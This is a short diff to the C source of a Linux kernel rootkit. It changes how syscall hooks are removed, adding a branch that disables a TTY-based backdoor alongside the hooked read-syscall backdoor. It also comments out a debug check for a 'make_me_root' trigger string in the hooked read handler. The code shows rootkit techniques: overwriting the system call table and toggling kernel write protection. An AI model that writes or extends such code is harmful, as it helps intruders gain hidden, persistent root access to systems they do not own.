@@ -73,11 +73,13 @@ remove_hooks(void)
         enable_protection();
     }
 
-    if (rootkit.backdoor != BD_OFF) {
+    if (rootkit.backdoor == BD_READ) {
         while (atomic_read(&read_count) > 0);
         disable_protection();
         sys_calls[__NR_read] = (void *)sys_read;
         enable_protection();
+    } else if (rootkit.backdoor == BD_TTY) {
+        disable_backdoor();
     }
 }
 
@@ -97,12 +99,9 @@ enable_protection(void)
 asmlinkage ssize_t
 g7_read(const struct pt_regs *pt_regs)
 {
-    int fd = (int)pt_regs->di;
-    void *buf = (void *)pt_regs->si;
-    size_t count = (size_t)pt_regs->dx;
-
-    if (!memcmp((const char *)buf, "make_me_root", count))
-        DEBUG_INFO("YEP");
+    /* unsigned fd = (unsigned)pt_regs->di; */
+    /* char *buf = (char *)pt_regs->si; */
+    /* size_t count = (size_t)pt_regs->dx; */
 
     return sys_read(pt_regs);
 }
